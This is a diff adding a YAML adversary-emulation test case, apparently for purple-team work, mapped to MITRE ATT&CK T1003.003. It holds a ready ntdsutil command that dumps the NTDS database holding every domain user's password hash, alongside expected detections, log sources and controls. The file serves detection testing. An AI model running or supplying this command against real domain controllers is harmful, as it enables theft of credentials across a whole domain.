@@ -1,0 +1,27 @@
+name: Extract NTDS credentials via ntdsutil.exe
+description: Dump domain hashes for all domain users on the domain controller via ntdsutil.exe, which uses Volume Shadow Services (VSS)
+metadata:
+  isv: 1
+  tactic: TA0006
+  tid: T1003.003
+  x_vectr_id: 08efdcab-54e0-4e06-8f72-b72f23e4fcab
+  x_guidance_id: 86cfeb1a-2053-4385-8be0-7d15a203eacb#1
+platforms:
+- windows
+prerequisites:
+- domain_admin
+guidance:
+- CMD> ntdsutil "ac in ntds" "ifm" "cr fu {{ outdirectory }}" q q
+block:
+- Suspicious process execution/behavior blocked by endpoint security tool
+detect:
+- Suspicious process execution/behavior detected by endpoint security tool
+- Suspicious Volume Shadow Service use detected in the SIEM using telemetry
+- Suspicious file access detected in the SIEM using file system telemetry
+logs:
+- edr:telemetry
+- winevent
+- process_create
+controls:
+- Endpoint Protection
+- SIEM
